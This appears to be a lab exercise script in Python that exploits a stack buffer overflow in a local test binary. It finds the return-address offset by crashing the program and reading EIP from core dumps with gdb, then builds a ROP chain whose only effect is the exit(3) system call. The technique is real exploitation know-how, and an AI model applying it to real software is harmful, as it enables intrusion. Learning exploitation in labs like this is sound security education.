import os
import re
import struct
import subprocess

import rop


# Find what's the offset of buff from the return address.
for n in range(1024, 2048):
    magic  = 'b'*4
    buff   = 'a'*n + magic
    print('trying buff size %d...' % n)
    # This time we'll be working with core dumps to avoid gdb/python differences.
    if os.path.exists('core'):
        os.remove('core')
    pid = os.fork()
    if pid == 0:
        os.execl('./a', './a', buff)
    pid, exit_code = os.waitpid(pid, 0)
    if exit_code == 0:
        print('program did not crash')
        continue
    if not os.path.exists('core'):
        print('no core file created')
        continue
    try:
        # gdb <program> --batch -ex <command> -ex <command> ... loads <program> into gdb and runs all the <commands> on it.
        output = subprocess.check_output(['gdb', './a', '--batch',
            '-ex', 'core core',
            '-ex', 'print $eip',
            '-ex', 'quit',
        ])
    except subprocess.CalledProcessError:
        print('gdb crashed')
        continue
    # The "print $eip" command prints $1 = 0x...
    eip = re.search(r'\$1 =.*?0x([0-9a-f]*)', output).group(1)
    if eip == magic.encode('hex'):
        break
print('buff offset is %d' % n)

mov_eax  = rop.find_gadget('MOV EAX, 1')[0]
pop_ebx  = rop.find_gadget('POP EBX')[0]     # gadget 'MOV EBX, 3' not found :(
inc_ebx  = rop.find_gadget('INC EBX')[0]
int_0x80 = rop.find_gadget('INT 0x80')[0]

# Create our shellcode.
shellcode = 'a'*n + struct.pack('<IIiIIIII', mov_eax, pop_ebx, -1, inc_ebx, inc_ebx, inc_ebx, inc_ebx, int_0x80)

# Let's go!
os.execl('./a', './a', shellcode)
